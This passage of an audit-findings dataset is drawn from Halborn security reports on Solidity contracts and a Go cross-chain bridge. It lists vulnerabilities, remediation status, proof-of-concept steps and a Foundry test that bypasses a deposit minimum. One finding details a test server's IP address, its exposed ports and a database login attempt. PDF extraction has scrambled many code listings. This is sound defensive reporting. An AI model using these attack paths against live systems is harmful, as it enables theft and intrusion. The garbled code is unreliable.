( address _owner , uint256 _type ) public returns ( uint256 ) { require ( _type < 5, \" invalid type \" ); return nft . mint ( _owner , _type ); } Risk Level: Likelihood - 3 Impact - 3 Recommendations: It is recommended to limit the function with an appropriate modifier, which will allow only authorized users to execute the function. Remediation Plan: SOLVED: The issue was fixed in commit: c5fd888b95f40e3c3c60f594708887db1922b663 16 ", "labels": ["Halborn", "Seascape_Riverboat_NFT", "Severity: Medium"]}, {"title": "MISSING ZERO ADDRESS CHECK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Riverboat_NFT_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Every There is no validation of the addresses anywhere in the code. address should be validated and checked that is different from zero. This issue is present in all the smart contracts, in the constructors and functions that use addresses as parameters. Some code location examples: RiverboatFactory.sol Listing 3: RiverboatFactory.sol 145 146 147 function setNft ( address _nft ) public onlyAdmin { nft = RiverboatNft ( _nft ); } RiverboatNft.sol Listing 4: RiverboatNft.sol 56 57 58 function setFactory ( address _factory ) public onlyOwner { factory = _factory ; } Risk Level: Likelihood - 3 Impact - 2 Recommendation: Validate that every address input is different from zero. 17 Remediation Plan: SOLVED: The issue was fixed in commit: c5fd888b95f40e3c3c60f594708887db1922b663 18 ", "labels": ["Halborn", "Seascape_Riverboat_NFT", "Severity: Low"]}, {"title": "USAGE OF BLOCK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Riverboat_NFT_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "During a manual static review, the tester noticed the use of now and block.timestamp. The contract developers should be aware that this does not mean current time. block.timestamp can be influenced by miners to a certain degree, so the testers should be warned that this may have some risk if miners collude on time manipulation to influence the price oracles. Code Location: Listing 5: contracts/RiverboatFactory (Lines 121) 115 116 117 118 119 120 121 122 123 124 125 } if ( sessionId > 0) require ( isFinished ( sessionId ) , \" last session hasnt finished yet \"); require ( _currencyAddress != address (0) , \" invalid currency address \" ); require ( _nftAddress != address (0) , \" invalid nft address \"); require ( _startPrice > 0, \" start price can 't be 0 \" ); require ( _priceIncrease > 0, \" price increase can 't be 0 \" ); require ( _startTime > block . timestamp , \" session should start in future \" ); require ( _intervalDuration > 0, \" interval duration can 't be 0 \"); require ( _intervalsAmount > 0, \" intervals amount can 't be 0 \" ); require ( _slotsAmount > 0, \" slots amount can 't be 0\" ); Listing 6: contracts/Riverboat 1 contracts / Riverboat . sol :234: uint256 _currentInterval = ( now - sessions [ _sessionId ] 2 contracts / Riverboat . sol :262: if ( now >= session . startTime && now < session 19 3 contracts / Riverboat . sol :274: if ( now > session . startTime + session . intervalsAmount * session . intervalDuration ) Risk Level: Likelihood - 2 Impact - 3 Recommendations: Use block.number instead of block.timestamp or now reduce the influence of miners. If possible, Its recommended to use Oracles. Remediation Plan: NOT APPLICABLE: The Seascape claims that the timescales is higher than 900 seconds. 20 ", "labels": ["Halborn", "Seascape_Riverboat_NFT", "Severity: Low"]}, {"title": "FLOATING PRAGMA", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Riverboat_NFT_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Riverboat contract Riverboat.sol, RiverboatFactory.sol and RiverboatNft. sol uses the floating pragma ^0.6.7. Contract should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, either an outdated compiler version that might introduce bugs that affect the contract system negatively or a pragma version too new which has not been extensively tested. Code Location: Listing 7: Riverboat.sol 1 pragma solidity ^0.6.7; Listing 8: RiverboatFactory.sol 1 pragma solidity 0.6.7; 2 Listing 9: RiverboatNft.soll 1 // Riverboats NFT 2 // SPDX - License - Identifier : MIT 3 pragma solidity 0.6.7; Risk Level: Likelihood - 1 Impact - 3 21 Recommendations: Consider locking the pragma version with known bugs for the compiler When possible, do not use floating pragma in the final live version. deployment. Specifying a fixed compiler version ensures that the bytecode produced does not vary between builds. This is especially important if you rely on bytecode-level verification of the code. Remediation Plan: SOLVED: The issue was fixed in commit: c5fd888b95f40e3c3c60f594708887db1922b663 22 ", "labels": ["Halborn", "Seascape_Riverboat_NFT", "Severity: Low"]}, {"title": "INTEGER OVERFLOW", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Riverboat_NFT_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "An overflow happens when an arithmetic operation reaches the maximum size of a type. In computer programming, an integer overflow occurs when an arithmetic operation attempts to create a numeric value that is outside the range that can be represented with a given number of bits -- either larger than the maximum or lower than the minimum representable value Code Location: Listing 10: contracts/Riverboat (Lines 126) 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 function startSession ( address _currencyAddress , address _nftAddress , address _lighthouseTierAddress , uint256 _startPrice , uint256 _priceIncrease , uint32 _startTime , uint32 _intervalDuration , uint32 _intervalsAmount , uint32 _slotsAmount ) { external onlyOwner if ( sessionId > 0) require ( isFinished ( sessionId ) , \" last session hasnt finished yet \"); require ( _currencyAddress != address (0) , \" invalid currency address \" ); require ( _nftAddress != address (0) , \" invalid nft address \"); require ( _startPrice > 0, \" start price can 't be 0 \" ); require ( _priceIncrease > 0, \" price increase can 't be 0 \" ); require ( _startTime > block . timestamp , \" session should start in future \" ); 23 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 require ( _intervalDuration > 0, \" interval duration can 't be 0 \"); require ( _intervalsAmount > 0, \" intervals amount can 't be 0 \" ); require ( _slotsAmount > 0, \" slots amount can 't be 0\" ); sessionId ++; sessions [ sessionId ] = Session ( _currencyAddress , _nftAddress , _lighthouseTierAddress , _startPrice , _priceIncrease , _startTime , _intervalDuration , _intervalsAmount , _slotsAmount ); We have located unsafe usage of arithmetical operations in many places in the contract: Listing 11: contracts/Riverboat 1 contracts / Riverboat . sol :252: uint256 _currentPrice = sessions [ _sessionId ]. startPrice + sessions [ _sessionId ] 2 contracts / Riverboat . sol :253: . priceIncrease * _currentInterval ; 3 contracts / Riverboat . sol :263: . startTime + session . intervalsAmount * session . intervalDuration ){ 4 contracts / Riverboat . sol :274 if ( now > session . startTime + session . intervalsAmount * session . intervalDuration ) Risk Level: Likelihood - 1 Impact - 1 24 Recommendation: It is recommended to use vetted safe math libraries for arithmetic operations consistently throughout the smart contract system. Remediation Plan: ACKNOWLEDGED: Since sessionId is type uint256, the likelihood of reaching 1077 is very low. Therefore, overflow is highly unlikely. 25 ", "labels": ["Halborn", "Seascape_Riverboat_NFT", "Severity: Informational"]}, {"title": "UNUSED IMPORT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Riverboat_NFT_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "During the test, it was determined that one of the import on the contract was not used. This situation does not pose any risk in terms of security. But it is important for the readability and applicability of the code Code Location: Listing 12: contracts/Riverboat (Lines 9) 1 pragma solidity ^0.6.7; 2 3 import \" ./../ openzeppelin / contracts / token / ERC20 / IERC20 . sol \" ; 4 import \" ./../ openzeppelin / contracts / token / ERC20 / SafeERC20 . sol \" ; 5 import \" ./../ openzeppelin / contracts / token / ERC721 / IERC721 . sol \"; 6 import \" ./../ openzeppelin / contracts / token / ERC721 / IERC721Receiver . sol \" ; 7 import \" ./../ openzeppelin / contracts / access / Ownable . sol \"; 8 import \" ./ LighthouseTierInterface . sol \"; 9 import \" ./ RiverboatNft . sol \"; Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to remove the RiverboatNft.sol import from the contract if it will not be used for any purpose. 26 Remediation Plan: SOLVED: The issue was fixed in commit: c5fd888b95f40e3c3c60f594708887db1922b663 27 ", "labels": ["Halborn", "Seascape_Riverboat_NFT", "Severity: Informational"]}, {"title": "PRIVATE SSH KEYS COMMITTED TO GIT REPOSITORY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/BoostyLabs_Tricorn_Bridge_Server_Golang_Security_Assessment_Report_Halborn_Final.pdf", "body": "Private SSH keys are publicly exposed on GitHub. Code Location: Private SSH keys are accessible by browsing the public casper-eth-bridge repository. Figure 1: Private keys are accessible via GitHub Proof of concept:  A malicious party reads the private keys.  The private keys are used to authenticate to the test server.  With access to the test server, the attacker can access other sensitive information such as database passwords, API keys, and private source code. 27 BVSS: AO:A/AC:L/AX:M/C:C/I:C/A:C/D:C/Y:C/R:N/S:C (10) Recommendation: Remove the SSH keys from GitHub. Disable their access to all servers, including test servers. Ensure that private information is not committed to git repositories. Remediation Plan: SOLVED: The casper-eth-bridge repository is no longer public. 28 ", "labels": ["Halborn", "BoostyLabs_Tricorn_Bridge_Server_Golang", "Severity: Critical"]}, {"title": "PANIC ON EVENT PARSING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/BoostyLabs_Tricorn_Bridge_Server_Golang_Security_Assessment_Report_Halborn_Final.pdf", "body": "The code for parsing events into Go data structures can panic under certain circumstances. If the incoming event data is not in the expected format, a nil dereference error can occur, which causes a panic in Go code. If encountered in a production environment, services using this code will crash and require manual restart from an administrator. Code Location: The code below performs string slicing without doing bound checks. This is the source of the panic error. When an offset exceeds the length of the slice, the code will panic. tricorn/internal/eventparsing/eventparsing.go Listing 1: getNextParam() accesses an offset index without checking that it is within the range of e.Bytes e. offset += offset param := e . Bytes [e . offset : e. offset + limit ] e. offset += limit return param 65 // getNextParam returns next parameter for specified data length . 66 func ( e * EventData ) getNextParam ( offset int , limit int ) string { 67 68 69 70 71 } 72 73 // GetEventType returns event type from event data . 74 func ( e * EventData ) GetEventType () ( int , error ) { 75  LengthSelectorTag . Int () ) eventTypeHex := e. getNextParam ( LengthSelectorString . Int () , 29 76 77 78 79 80 81 82 83 84 85 } eventTypeBytes , err := hex . DecodeString ( eventTypeHex ) if err != nil { return 0, err } eventType := big . NewInt (0) . SetBytes ( eventTypeBytes ) return int ( eventType . Int64 () ) , nil Proof-of-concept:  An event is processed by the chain that is not in the expected format.  When attempting to parse the event, the code pictured above panics.  Bridge services calling this code will be unavailable until an administrator restarts the service This vulnerability was discovered using fuzz testing. Further details can be found in the Automated Testing section at the end of this report. BVSS: AO:A/AC:L/AX:M/C:N/I:N/A:C/D:N/Y:N/R:N/S:C (8.4) Recommendation: Add bounds checks to the parsing code to ensure that panics do not occur. Remediation Plan: SOLVED: BoostyLabs solved the issue by adding the checks. Pull Request : 310 30 ", "labels": ["Halborn", "BoostyLabs_Tricorn_Bridge_Server_Golang", "Severity: High"]}, {"title": "TOKENID IS HARD", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/BoostyLabs_Tricorn_Bridge_Server_Golang_Security_Assessment_Report_Halborn_Final.pdf", "body": "The value for TokenId in transfers is hard-coded. This means that it is only possible to transfer a single ERC-20 test token. As a result, the bridge is not fully functional, as there is no way to specify a different token based on user input. Code Location: bridge/service.go Listing 2: Example 1: hard-coded to the value 1 (Line 400) Building a Bridge In transfer: tokenId is 399 400 401 402 403 tokenTransfer := transfers . TokenTransfer { TokenID : Amount : Status : SenderNetworkID : 1, // todo : dynamically change . * amount , transfers . StatusWaiting , int64 ( networks . NetworkNameToID [  senderNetworkName ]) , 404 405 406 407 408 409 410 411 SenderAddress : RecipientNetworkID : int64 ( recipientNetworkID ) , RecipientAddress : recipientAddress , senderAddress , } err = service . tokenTransfers . Create ( ctx , tokenTransfer ) if err != nil { service . log . Error ( fmt . Sprintf (\" couldn 't create token  transfer for network name %s \" , request . Sender . NetworkName ) , Error .  Wrap ( err )) 412 413 414 415 return BridgeInSignatureResponse {} , Error . Wrap ( err ) } return bridgeInSignature , service . nonces . Increment ( ctx ,  senderID ) 31 bridge/service.go Listing 3: Example 2: Responding to a blockchain event log to do a Bridge Out action (Lines 580,609) 573 574 { // call BridgeOut . toAddress , err := networks . StringToBytes (  recipientNetworkID , eventFund . EventFundsIn . To . Address ) 575 576 577  Error () ) 578 579 580 if err != nil { service . log . Error (\" \" , Error . Wrap ( err )) return status . Error ( codes . Internal , Error . Wrap ( err ). } token , err := service . networkTokens . Get ( ctx ,  recipientNetworkID , 1) // TODO : add dynamic token id . 581 582 583  Error () ) 584 585 586 if err != nil { service . log . Error (\" \" , Error . Wrap ( err )) return status . Error ( codes . Internal , Error . Wrap ( err ). } bridgeOut , err := service . connectors [ networks . Name (  eventFund . EventFundsIn . To . NetworkName ) ]. BridgeOut ( ctx , chains .  TokenOutRequest { 587 588 589 590 591 592 593 594 595 596 597 598 Amount : amount , Token : To : From : networks . Address { token . ContractAddress , toAddress , NetworkName : networkName . String () , Address : hex . EncodeToString ( senderAddress ) , }, TransactionID : big . NewInt ( int64 ( transactionID )) , }) if err != nil { service . log . Error (\" \" , Error . Wrap ( err )) return status . Error ( codes . Internal , Error . Wrap ( err ).  Error () ) 599 600 601 } if len ( bridgeOut . Txhash ) == 0 { err = errs . New (\" couldn 't send bridgeOut in network %s \"  , eventFund . EventFundsIn . To . NetworkName ) 602 603  Error () ) service . log . Error (\" \" , Error . Wrap ( err )) return status . Error ( codes . Internal , Error . Wrap ( err ). 32 604 605 606 607 608 609 610 611 612 } } tokenTransfer := transfers . TokenTransfer { TokenID : Amount : SenderAddress : RecipientAddress : recipientAddress , 1, // todo : dynamically change . * amount , senderAddress , } Proof-of-concept:  A user wishes to make a transfer using the bridge.  When visiting the UI, the user can choose only a Test token.  As a result, the user cannot transfer their ERC-20 tokens. BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:H/D:N/Y:N/R:N/S:U (7.5) Recommendation: Remove placeholder values and replace with dynamic values. Before pushing changes to the codebase, ensure that core operations are tested thoroughly with a range of values. Remediation Plan: SOLVED: BoostyLabs solved the issue by fixing the implementation. Pull Request : 336 33 ", "labels": ["Halborn", "BoostyLabs_Tricorn_Bridge_Server_Golang", "Severity: High"]}, {"title": "USERS CANNOT WITHDRAW FUNDS DUE TO HARD", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/BoostyLabs_Tricorn_Bridge_Server_Golang_Security_Assessment_Report_Halborn_Final.pdf", "body": "Users cannot withdraw their liquidity from the bridge due to a hard-coded value for commission. The expected behavior is that a user can deposit tokens to the bridge, and later request a Cancel Signature in order to withdraw the tokens they have deposited. This in turn triggers a Transfer Out action that corresponds to a Solidity function that allows a user to withdraw funds. This two-step process involves a deposit and a withdraw action, each referred to as Bridge In and Cancel Signature within the Go code. For both steps, a commission that represents a gas cost of the transaction is calculated and sent as a value in a Bridge In transaction to Solidity. The Solidity code stores this amount separately from the contacts main token balance in a map that matches the senders address to the commission amount. Code Location: The commission field for TransferOut is calculated in the EstimateTransfer function in turns uses a go-ethereum method, SuggestGasPrice. chains/evm/service.go Listing 4: (Lines 182,192,195) 181 // EstimateTransfer estimates transfer fee and time . 182 func ( service * Service ) EstimateTransfer ( ctx context . Context ) (  chains . Estimation , error ) { 183 184 185 186 gasPrice , err := service . ethClient . SuggestGasPrice ( ctx ) if err != nil { return chains . Estimation {} , Error . Wrap ( err ) } 34 187 188 189 190 191 192 // TODO : change in dynamic way , as in BridgeOut method . gasLimit := new ( big . Int ). SetUint64 ( service . config . GasLimit ) feeWei := gasPrice . Mul ( gasPrice , gasLimit ) fee := new ( big . Float ). Quo ( new ( big . Float ). SetInt ( feeWei ) , new (  big . Float ). SetUint64 ( wei )) 193 194 195 196 197 198 199 200 201 } estimation := chains . Estimation { Fee : FeePercentage : EstimatedConfirmation : service . config . ConfirmationTime , fee . String () , service . config . FeePercentage , } return estimation , nil Ordinarily, the commission is calculated using the above function. However, it is commented-out in the codebase: tricorn/bridge/service.go Listing 5: Building a BridgeIn transaction: gasCommission is hard-coded to the value 1 and calculations are commented-out. (Lines 363,364,379) 363 364 // TODO : uncomment after fix . // destinationEstimation , err := service . connectors [  recipientNetworkName ]. EstimateTransfer ( ctx , transfers .  EstimateTransfer { 365 366 367 368 369 370 371 372 373 374 request . Sender . NetworkName , request . TokenID , request . Amount , SenderNetwork : RecipientNetwork : request . Destination . NetworkName , TokenID : Amount : // // // // // }) // if err != nil { // // } // // gasCommission , ok := new ( big . Int ) . SetString ( return BridgeInSignatureResponse {} , Error . Wrap ( err )  destinationEstimation . Fee , 10) 375 376 // if ! ok { // return BridgeInSignatureResponse {} , Error . New (\" couldn 't  parse gas commission \") 35 377 378 379 // }. gasCommission := new ( big . Int ). SetInt64 (1) The same commission value is not commented-out for the CancelSignature function (which is the corresponding withdraw action after the deposit action performed by BridgeIn). tricorn/bridge/service.go Listing 6: Building a CancelSignature transaction: the commission is calculated via EstimateTransfer 455 estimation , err := service . connectors [ networkName ].  EstimateTransfer ( ctx , transfers . EstimateTransfer { 456 457 458 459 460 461 462  ) 463 464 465 SenderNetwork : networkName . String () , RecipientNetwork : networkName . String () , TokenID : Amount : uint32 ( tokenTransfer . TokenID ) , tokenTransfer . Amount . String () , }) if err != nil { return transfers . CancelSignatureResponse {} , Error . Wrap ( err } commission , ok := new ( big . Int ). SetString ( estimation . Fee , 10) The commission calculated above is eventually encoded in a Transfer Out transaction that corresponds to the Solidity function transferOut. The BridgeIn commission will be equal to 1 because it is hard-coded. As a result, the TransferOut commission will always be much higher than the BridgeIn Commission by several orders of magnitude. When the _commissionPools value reaches 0, the operation will fail. This will happen as soon as a user tries to transferOut given the difference in size between the commission values. Ultimately, this will cause the transferOut operation to revert to Solidity when the commission is subtracted from the pool 36 ethereum/contracts/Bridge.sol repository. from the tricorn-smart-contracts git Listing 7: commission is subtracted from _commissionPools revert ( Errors . ALREADY_USED_SIGNATURE ); function transferOut ( address token , address recipient , uint256 amount , uint256 commission , uint256 nonce , bytes calldata signature ) external whenNotPaused { if ( _usedNonces [ nonce ]) { _checkTransferOutRequest ( address ( this ) , token , recipient , amount , commission , nonce , signature } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  totalSumForTransfer ); 34 ); } _usedNonces [ nonce ] = true ; _commissionPools [ token ] -= commission ; uint256 totalSumForTransfer = amount + commission ; IERC20 ( token ). safeTransfer ( recipient , totalSumForTransfer ); // TODO : Descrease pool commission emit TransferOut ( recipient , nonce , token , 37 Proof-of-concept:  A user deposits tokens into the bridge via Bridge In. The commission value is 1.  Later, the user wishes to withdraw their tokens via Cancel Signature which creates a Transfer Out action with a much higher commission.  When the Solidity code executes, a revert will occur when the _commissionPool value underflows as the high commission value is subtracted from 1.  As a result, the users funds are locked in the contract. BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:M/D:C/Y:N/R:P/S:C (7.0) Recommendation: Remove the TODO message and fix the code used to calculate the commission for the BridgeIn transaction type. Remediation Plan: SOLVED: The commented code has been removed and new logic for calculating commissions is added in PR 300. 38 ", "labels": ["Halborn", "BoostyLabs_Tricorn_Bridge_Server_Golang", "Severity: High"]}, {"title": "DEPOSITS CAN BE LOCKED DUE TO WITHDRAWALS BY CONTRACT OWNER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/BoostyLabs_Tricorn_Bridge_Server_Golang_Security_Assessment_Report_Halborn_Final.pdf", "body": "DEPOSITS CAN BE LOCKED DUE TO WITHDRAWALS BY CONTRACT OWNER", "labels": ["Halborn", "BoostyLabs_Tricorn_Bridge_Server_Golang", "Severity: Medium"]}, {"title": "BRIDGE SUPPORTS UNENCRYPTED TRAFFIC", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/BoostyLabs_Tricorn_Bridge_Server_Golang_Security_Assessment_Report_Halborn_Final.pdf", "body": "network microservices bridge The connections. gRPCs servers are initialized using an optional set of server options. If the Creds option is not specified, the connections will not be encrypted. unencrypted traffic allow over Code Location: An example where the code creates a gRPC server is outlined in the following code excerpt: internal/server/grpc/server.go Listing 8: gRPC server created with NewServer without a Creds option ) grpcServer := grpc . NewServer ( grpc . MaxRecvMsgSize ( defaultGrpcMessageSize ) , grpc . MaxSendMsgSize ( defaultGrpcMessageSize ) , 39 40 // NewServer is a constructor for GRPC server . 41 func NewServer ( logger logger . Logger , registerServer func (* grpc .  Server ) , name , address string ) * grpcserver { 42 43 44 45 46 47 48 49 50 51 52 53 54 55 } log : address : address , name : server : name , grpcServer , registerServer ( grpcServer ) return & grpcserver { logger , } 41 BVSS: AO:A/AC:L/AX:L/C:M/I:N/A:N/D:N/Y:N/R:N/S:C (6.2) Recommendation: Enable encryption for network connections in the bridge project. Remediation Plan: SOLVED: BoostyLabs added code to encrypt traffic in PR 296. 42 ", "labels": ["Halborn", "BoostyLabs_Tricorn_Bridge_Server_Golang", "Severity: Medium"]}, {"title": "ADMINISTRATOR LOGIN PROTOCOLS ARE ACCESSIBLE FOR TEST SERVER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/BoostyLabs_Tricorn_Bridge_Server_Golang_Security_Assessment_Report_Halborn_Final.pdf", "body": "The documentation for the public casper-eth-bridge repository lists an IP address. Halborn examined this web server and discovered several configuration issues, including:  Database authentication exposed to the Internet.  TLS connection not enabled for sensitive data.  Sensitive ports exposed to the Internet. Code Location: README.md Listing 9: Excerpt from README file including the IP address 1 [ Logs ]( http ://142.93.173.38:9999/) This port hosted a login form for a Dozzle logging server that was available without encryption (as seen in the above excerpt, the logs are served using the plaintext http:// protocol). The [Dozzle documentation]((https://github.com/amir20/dozzle#authentication) recommends using TLS, as otherwise passwords will be revealed. A nmap scan was performed against the server in order to look for other exposed ports: 43 Figure 2: Exposed ports An exposed port 22 indicates that an SSH login is possible via the Internet. If an attacker brute-forces the password, they can obtain access to a user account on the server. Postgres is accessible to the internet on port 6433. A login was attempted as a proof-of-concept. Figure 3: Login is possible to postgres via the Internet. The first line shows a login attempt on a random, closed port. The second indicates that a Postgres service is listening The remaining exposed ports overlap with many of the ones that are opened in Tricorns deploy/docker-compose.yml file, namely: Listing 10: Ports opened in the Docker file 1 3000 2 6432 3 6433 4 6666 5 7777 6 8088 7 8888 8 9999 44 Taken together, this indicates that the bridge microservices were likely running on this server. This means that it would have been possible for an attacker to brute-force the user account and database passwords for the test server. Proof of Concept:  An attacker runs a tool to brute-force the SSH or Postgres password for the test server.  If successful, they could access the source code of the application and/or the contents of the database.  If password reuse occurs, the attacker may be able to compromise other infrastructure operated by Boosty. BVSS: AO:A/AC:L/AX:H/C:M/I:M/A:M/D:N/Y:N/R:N/S:C (3.1) Recommendation: Do not expose authentication to the public Internet. Instead, ensure that only privileged connections are allowed via a VPN. Ensure that public key authentication is used for SSH rather than passwords. Use TLS to secure authentication rather than plaintext HTTP connections. Avoid reusing credentials in testing and production environments. If there has been any credential reuse, then all credentials should be changed immediately to be strong, unique passphrases. As the server has been exposed to the Internet, consider investigating the server forensically in case a breach has already occurred. Remediation Plan: SOLVED: BoostyLabs was notified of this finding immediately during the initial stages of the assessment. The public repository listing the IP address is no longer accessible. The IP address is no longer accessible. 45 ", "labels": ["Halborn", "BoostyLabs_Tricorn_Bridge_Server_Golang", "Severity: Low"]}, {"title": "UI ELEMENT FOR TRANSACTION FEE IS HARD", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/BoostyLabs_Tricorn_Bridge_Server_Golang_Security_Assessment_Report_Halborn_Final.pdf", "body": "The web application UI is hard-coded to display a fee percentage of 5%. Users will not be informed of the actual percentage as configured in the bridge or the contract. Code Location: web/bridge/src/apps/views/Swaps/index.tsx {language=javascript caption=\"The fee is displayed using fixed 46 text. There is no retrieval of a dynamic value.} <span className=\" swap__comission__label\">Current fee is 5%</span> During testing, the web application displayed a fee of 5% even though both the Go bridge and smart contract was configured with a value of 4%. Proof of concept:  At some point, the bridge fee is set to 6%.  A user makes a bridge transaction using the web app and sees 5% quoted as the fee percentage.  After transferring their funds, the user has paid more than they expected. BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:L/Y:N/R:N/S:C (3.1) Recommendation: Populate this UI element dynamically according to the percentage value configured in the relevant smart contract(s). Remediation Plan: SOLVED: BoostyLabs solved the issue by changing the UI. 47 ", "labels": ["Halborn", "BoostyLabs_Tricorn_Bridge_Server_Golang", "Severity: Low"]}, {"title": "PRIVATE ETHERSCAN API KEY EXPOSED IN GIT REPOSITORY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/BoostyLabs_Tricorn_Bridge_Server_Golang_Security_Assessment_Report_Halborn_Final.pdf", "body": "An Etherscan API key is publicly exposed on GitHub. Code Location: The API key was discovered in the casper-eth-bridge repository in the file boosty-smart-contracts/ethereum/.env.example. Simple testing was performed to check that the key was active: 48 Proof of concept:  A malicious party discovers the API key in the repository.  They use the API key to make exhaust the number of tokens that Boosty purchased.  Any services relying on Etherscan will no longer be accessible. BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:M/D:N/Y:N/R:P/S:U (2.5) Recommendation: Remove the API key from the repository. Deactivate it within the Etherscan website and generate a new key for operations. Ensure that no private information is committed to GitHub repositories. Remediation Plan: SOLVED: The casper-eth-bridge repository is no longer public. 49 4.10 (HAL-10) LACK OF RATE LIMITING ON THE API - LOW (3.1) ", "labels": ["Halborn", "BoostyLabs_Tricorn_Bridge_Server_Golang", "Severity: Informational"]}, {"title": "MINIMUM DEPOSIT RESTRICTION CAN BE BYPASSED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MetaPool_ETH_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "LiquidUnstakePool and Staking smart contracts allow to deposit/withdraw tokens by using ERC4626 custom vaults. In this implementation, a modifier is involved in deposits since it guarantees a minimum amount of tokens in each deposit. This modifier should be applied to each function related to deposit. However, there is existing a public function named mint which allows specifying an amount of shares to mint instead of an amount of tokens to deposit as deposit functions do. This function is not restricted by the aforementioned modifier and allows to mint arbitrary amount of shares without restrictions, thus breaking the invariant set by validDeposit modifier. Code Location: Listing 1: contracts/LiquidUnstakePool.sol 58 modifier validDeposit ( uint _amount ) { 59 60 61 } require ( _amount >= MIN_DEPOSIT , \" Deposit at least 0.01 ETH \" ); _; Listing 2: contracts/LiquidUnstakePool.sol (Line 134) 129 function _deposit ( 130 131 132 133 134 ) internal virtual override nonReentrant { 135 address _caller , address _receiver , uint _assets , uint _shares _assets = _getAssetsDeposit ( _assets ); 19 136 137 138 139 } _mint ( _receiver , _shares ); ethBalance += _assets ; emit AddLiquidity ( _caller , _receiver , _assets , _shares ); Listing 3: contracts/Staking.sol 61 modifier validDeposit ( uint _amount ) { 62 63 64 } require ( _amount >= MIN_DEPOSIT , \" Deposit at least 0.01 ETH \" ); _; Listing 4: contracts/Staking.sol (Line 270) address _caller , address _receiver , uint256 _assets , uint256 _shares 265 function _deposit ( 266 267 268 269 270 ) internal override checkWhitelisting () { _assets = _getAssetsDeposit ( _assets ); 271 ( uint sharesFromPool , uint assetsToPool ) = _getmpETHFromPool ( 272  _shares , _receiver ); 273 274 275 276 277 278 279 _shares -= sharesFromPool ; _assets -= assetsToPool ; if ( _shares > 0) _mint ( _receiver , _shares ); stakingBalance += _assets ; emit Deposit ( _caller , _receiver , _assets + assetsToPool ,  _shares + sharesFromPool ); 280 } BVSS: AO:A/AC:L/AX:L/C:N/I:M/A:N/D:L/Y:N/R:N/S:U (5.6) 20 Proof of Concept: In order to prove this issue, since the mint function is available, an account just has to perform a call with an amount lower than 0.1 ether as these values are supposed to be restricted. Listing 5: Minimum deposit restriction bypass } console . log (\" \" ); console . log (\" [1] LiquidUnstakePool balance ( ETH ): \" , address ( prepareBalances () ; console . log (\" [1] Attacker balance ( shares ) :\" , vm . startPrank ( ALICE ); { weth . approve ( address ( liquidunstakepool ) , 1) ; liquidunstakepool . mint (1 , ALICE ); 1 function testMintWithoutRestrictions () public { 2 3 4  liquidunstakepool ). balance ); 5  IERC20MetadataUpgradeable ( liquidunstakepool ). balanceOf ( ALICE )) ; 6 7 8 9 10 11 12 13 14  liquidunstakepool ). balance ); 15  IERC20MetadataUpgradeable ( liquidunstakepool ). balanceOf ( ALICE )) ; 16 } 17 18 function prepareBalances () public { vm . deal ( ALICE , 200 ether ); 19 vm . deal ( BOB , 200 ether ); 20 21 vm . deal ( CHARLIE , 200 ether ); 22 23 24 25 26 } weth . mint ( ALICE , 200 ether ); weth . mint ( BOB , 200 ether ); weth . mint ( CHARLIE , 200 ether ); console . log (\" [2] Attacker balance ( shares ) :\" , console . log (\" [2] LiquidUnstakePool balance ( ETH ): \" , address ( 21 Files required to execute properly this test such as DeploymentHelper.sol have been included in the Appendix of this document. Recommendation: It is recommended to set the validDeposit modifier in the mint function or include it in the _deposit internal function. Remediation Plan: SOLVED: The MetaPool team solved the issue by checking this invariant in the _deposit private function in the following commit ID:  79f910ea4f79ba108d21c2c67eb9b59478c2e7c0. 22 ", "labels": ["Halborn", "MetaPool_ETH_Staking", "Severity: Medium"]}, {"title": "ERC4626 VAULT DEPOSITS AND WITHDRAWS SHOULD CONSIDER SLIPPAGE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MetaPool_ETH_Staking_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The scoped repositories make use of ERC4626 custom implementations that should follow the EIP-4626 definitions. This standard states the follow- ing security consideration: \"If implementors intend to support EOA account access directly, they should consider adding another function call for deposit/mint/withdraw /redeem with the means to accommodate slippage loss or unexpected deposit/withdrawal limits, since they have no other means to revert the transaction if the exact output amount is not achieved.\" These vault implementations do not implement a way to limit the slippage when deposits/withdraws are performed. This condition affects specially to EOA since they dont have a way to verify the amount of tokens received and revert the transaction in case they are too few compared to what was expected to be received. Applying this security consideration would help to EOA 